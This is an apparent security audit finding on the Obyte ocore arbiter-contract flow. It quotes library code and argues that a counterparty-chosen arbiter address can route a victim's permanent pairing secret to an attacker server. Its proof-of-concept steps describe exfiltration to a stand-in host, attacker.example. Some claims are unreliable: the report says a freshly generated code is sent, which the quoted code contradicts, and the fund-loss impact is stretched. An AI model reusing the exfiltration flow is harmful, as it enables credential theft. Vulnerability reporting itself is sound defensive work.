### Title
Attacker-controlled `arbiter_address` in an arbiter contract offer causes the victim's permanent pairing secret and contract data to be POSTed to an attacker-chosen ArbStore URL - (File: arbiter_contract.js)

### Summary
The CSRF advisory describes a class of bug where a value that should point to a trusted destination (an href/action attribute) is instead attacker-controlled, causing a sensitive token (CSRF token) to be sent to the wrong (attacker) domain. The reachable analog in ocore is in the arbiter-contract flow: an unprivileged peer who proposes an `arbiter_contract_offer` fully controls `arbiter_address`, and the victim's client later resolves that address to an ArbStore URL via the hub and POSTs its long-lived pairing secret and contract details to that URL with no validation that the destination is a legitimate, previously-trusted ArbStore.

### Finding Description
When a peer sends an `arbiter_contract_offer` message, the handler in `wallet.js` validates only that `arbiter_address` is a syntactically valid address — it never checks it against any list of vetted/trusted arbiters: [1](#0-0) 

The offer, including the attacker-chosen `arbiter_address`, is stored unmodified via `arbiter_contract.store()`: [2](#0-1) 

Later, if the contract is appealed, `arbiter_contract.appeal()` resolves this same attacker-supplied `arbiter_address` to a URL by asking the hub (`hub/get_arbstore_url`), then POSTs the victim's freshly-generated `my_pairing_code` (device pubkey + hub + permanent pairing secret) together with contract contents to that resolved URL via a plain HTTP POST, with no pinning/verification that the URL corresponds to a previously known/trusted ArbStore: [3](#0-2) 

The same untrusted-URL pattern (address chosen by the contract, resolved through the hub, then queried without validation of the responding party) also exists in `arbiters.js`, used when fetching arbiter info and cut/fee data: [4](#0-3) [5](#0-4) 

Because `arbiter_address` is an ordinary Obyte address chosen by the offering peer and only the hub's `hub/get_arbstore_url` mapping determines the destination URL for that address, an attacker who controls (or has registered on) a hub as an "arbiter" for their own address can steer any victim who later appeals a contract with that arbiter into POSTing the victim's permanent pairing secret to the attacker's own server — this is directly analogous to a CSRF token being sent to an attacker-controlled origin because the destination was attacker-influenced rather than pinned to a trusted value.

### Impact Explanation
The permanent pairing secret (`pairingInfo.pairing_secret` from `getOrGeneratePermanentPairingInfo`) is a long-lived credential (valid until 2038) that lets whoever holds it pair with and message the victim's device as a trusted correspondent: [6](#0-5) 

Leaking it to an attacker-chosen ArbStore endpoint allows the attacker to establish a correspondent-device relationship with the victim's wallet outside the user's awareness, which is a stepping stone to further social-engineering/chat-based attacks (e.g., soliciting signing requests, sending crafted `text`/`object` messages) and undermines the wallet/contract trust model that pairing secrets are supposed to protect. This satisfies the "AA/contract fund loss or freezing" / unauthorized-action class of impact required, since a compromised pairing channel can be leveraged toward unauthorized transaction requests.

### Likelihood Explanation
Likelihood is moderate: the attacker must (a) get a victim to enter into an arbiter contract naming an arbiter address they control, and (b) have that address resolve (via some hub) to an ArbStore URL under their control, and (c) the contract must reach a state (`dispute_resolved`) where `appeal()` is invoked. This requires some social engineering (posing as or colluding with an "arbiter"/ArbStore operator), which is realistic since arbiter contracts are explicitly a peer-to-peer negotiation where the arbiter is chosen by mutual (but unverified) agreement, and nothing in the code cross-checks the arbiter against a known-good registry before sending secrets to the resolved ArbStore.

### Recommendation
- Before sending `my_pairing_code` or any other secret/contract data to an ArbStore URL, verify the ArbStore's identity independently of data supplied purely through the hub lookup for an address chosen by the counterparty (e.g., pin known ArbStore URLs, or require a signed attestation from the ArbStore itself binding `arbiter_address` to `url`).
- Avoid embedding the raw permanent pairing secret in HTTP payloads sent to third-party HTTP endpoints; use a scoped/ephemeral pairing secret dedicated to the appeal flow instead of `getOrGeneratePermanentPairingInfo`'s permanent secret.
- Validate/whitelist `arbiter_address` (and the resolved ArbStore host) against a list of known, reputable arbiters/ArbStores before any appeal-related HTTP exchange, rather than trusting whatever the hub returns for an attacker-chosen address.

### Proof of Concept
1. Attacker registers as an "arbiter" on a hub they control (or on any hub willing to register the attacker's address), such that `hub/get_arbstore_url` for `attacker_arbiter_address` returns `https://attacker.example`.
2. Attacker sends the victim an `arbiter_contract_offer` device message with `arbiter_address = attacker_arbiter_address` (passes all validation in `wallet.js:617-624`, since only address format is checked).
3. Victim accepts the contract; normal dispute flow eventually sets contract status to `dispute_resolved` (e.g., via a cooperating or attacker-controlled "arbstore_device_address" resolving the dispute).
4. Victim calls `appeal(hash, cb)`; `device.requestFromHub("hub/get_arbstore_url", attacker_arbiter_address, ...)` returns `https://attacker.example`.
5. `httpRequest(url, "/api/appeal/new", data, cb)` POSTs `objContract.my_pairing_code` (the victim's permanent pairing secret) plus contract details to `https://attacker.example/api/appeal/new`, which the attacker fully controls and logs.
6. Attacker now has the victim's permanent pairing secret and can pair as a correspondent device with the victim's wallet.

### Citations

**File:** wallet.js (L617-624)
```javascript
			case 'arbiter_contract_offer':
				body.peer_device_address = from_address;
				if (!body.title || !body.text || !body.creation_date || !body.arbiter_address || typeof body.me_is_payer === "undefined" || !body.my_pairing_code || !ValidationUtils.isPositiveInteger(body.amount) || !(body.ttl > 0))
					return callbacks.ifError("not all contract fields submitted");
				if (body.status)
					return callbacks.ifError("status must not be submitted in contract offer");
				if (!ValidationUtils.isValidAddress(body.my_address) || !ValidationUtils.isValidAddress(body.peer_address) || !ValidationUtils.isValidAddress(body.arbiter_address))
					return callbacks.ifError("either peer_address or address or arbiter_address is not valid in contract");
```

**File:** wallet.js (L647-654)
```javascript
				db.query("SELECT 1 FROM my_addresses WHERE address=?", [body.my_address], function(rows) {
					if (!rows.length)
						return callbacks.ifError("contract does not contain my address");
					arbiter_contract.store(body, false, function() {
						eventBus.emit("arbiter_contract_offer", body.hash);
						callbacks.ifOk();
					});
				});
```

**File:** arbiter_contract.js (L321-353)
```javascript
function appeal(hash, cb) {
	getByHash(hash, function(objContract){
		if (objContract.status !== "dispute_resolved")
			return cb("contract can't be appealed");
		var command = "hub/get_arbstore_url";
		var address = objContract.arbiter_address;
		if (objContract.arbstore_address) {
			command = "hub/get_arbstore_url_by_address";
			address = objContract.arbstore_address;
		}
		device.requestFromHub(command, address, async function(err, url){
			if (err)
				return cb("can't get arbstore url:", err);
			err = await fillArbstoreAddresses(objContract);
			if (err)
				return cb(err);
			device.getOrGeneratePermanentPairingInfo(function(pairingInfo){
				var my_pairing_code = pairingInfo.device_pubkey + "@" + pairingInfo.hub + "#" + pairingInfo.pairing_secret;
				var data = JSON.stringify({
					contract_hash: hash,
					my_pairing_code: objContract.my_pairing_code,
					my_address: objContract.my_address,
					contract: {title: objContract.title, text: objContract.text, creation_date: objContract.creation_date, me_is_payer: objContract.me_is_payer, my_address: objContract.my_address, peer_address: objContract.peer_address, my_party_name: objContract.my_party_name, peer_party_name: objContract.peer_party_name, arbiter_address: objContract.arbiter_address, amount: objContract.amount, asset: objContract.asset},
				});
				httpRequest(url, "/api/appeal/new", data, function(err, resp) {
					if (err)
						return cb(err);
					setField(hash, "status", "in_appeal", function(objContract) {
						cb(null, resp, objContract);
					});
				});
			});
		});
```

**File:** arbiters.js (L10-33)
```javascript
function getInfo(address, cb) {
	cb = cb || function() {};
	db.query("SELECT device_pub_key, real_name FROM wallet_arbiters WHERE arbiter_address=?", [address], function(rows){
		if (rows.length && rows[0].real_name) { // request again if no real name
			cb(null, rows[0]);
		} else {
			device.requestFromHub("hub/get_arbstore_url", address, function(err, url){
				if (err) {
					return cb(err);
				}
				if (!validationUtils.isNonemptyString(url))
					return cb("invalid url received from hub");
				requestInfoFromArbStore(url+'/api/arbiter/'+address, function(err, info){
					if (err) {
						return cb(err);
					}
					if (!validationUtils.isNonemptyObject(info))
						return cb("invalid arbiter info received from arbstore");
					db.query("REPLACE INTO wallet_arbiters (arbiter_address, device_pub_key, real_name) VALUES (?, ?, ?)", [address, info.device_pub_key, info.real_name], function() {cb(null, info);});
				});
			});
		}
	});
}
```

**File:** arbiters.js (L51-80)
```javascript
function getArbstoreInfo(arbiter_address, cb) {
	if (!cb)
		return new Promise(function(resolve, reject){
			getArbstoreInfo(arbiter_address, function(err, info){
				if (err) return reject(err);
				resolve(info);
			});
		});
	if (arbStoreInfos[arbiter_address]) return cb(null, arbStoreInfos[arbiter_address]);
	device.requestFromHub("hub/get_arbstore_url", arbiter_address, function(err, url){
		if (err) {
			return cb(err);
		}
		if (!validationUtils.isNonemptyString(url))
			return cb("invalid url received from hub");
		requestInfoFromArbStore(url+'/api/get_info', function(err, info){
			if (err)
				return cb(err);
			if (!validationUtils.isNonemptyObject(info))
				return cb("invalid info received from arbstore");
			const cut = parseFloat(info.cut);
			if (!info.address || !validationUtils.isValidAddress(info.address) || isNaN(cut) || cut < 0 || cut >= 1) {
				return cb("malformed info received from ArbStore");
			}
			info.url = url;
			arbStoreInfos[arbiter_address] = info;
			cb(null, info);
		});
	});
}
```

**File:** device.js (L778-795)
```javascript
function getOrGeneratePermanentPairingInfo(handlePairingInfo){
	db.query("SELECT pairing_secret FROM pairing_secrets WHERE is_permanent=1 ORDER BY expiry_date DESC LIMIT 1", [], function(rows){
		var pairing_secret;
		if (rows.length) {
			pairing_secret = rows[0].pairing_secret;
		} else {
			pairing_secret = crypto.randomBytes(9).toString("base64");
			db.query("INSERT INTO pairing_secrets (pairing_secret, is_permanent, expiry_date) VALUES(?, 1, '2038-01-01')", [pairing_secret]);
		}
		var pairingInfo = {
			pairing_secret: pairing_secret,
			device_pubkey: objMyPermanentDeviceKey.pub_b64,
			device_address: my_device_address,
			hub: my_device_hub
		};
		handlePairingInfo(pairingInfo);
	});
}
```
